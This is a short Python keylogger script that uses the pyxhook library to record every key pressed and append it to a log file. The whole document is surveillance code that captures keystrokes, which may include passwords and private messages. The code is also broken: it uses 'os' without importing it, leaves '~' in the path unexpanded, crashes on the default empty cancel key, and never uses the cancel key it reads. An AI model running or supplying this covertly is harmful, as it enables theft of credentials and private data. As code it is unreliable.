import pyxhook

log_file = os.environ.get('pyLogger_file','~/Desktop/file.log')
cancel_key = ord(os.environ.get('pylogger_cancel','')[0])

def OnKeyPress(event):
    with open(log_file, 'a') as f:
        f.write('{}\n'.format(event.Key))

new_hook = pyxhook.HookManager()
new_hook.KeyDown = OnKeyPress
new_hook.HookKeyboard()
new_hook.start()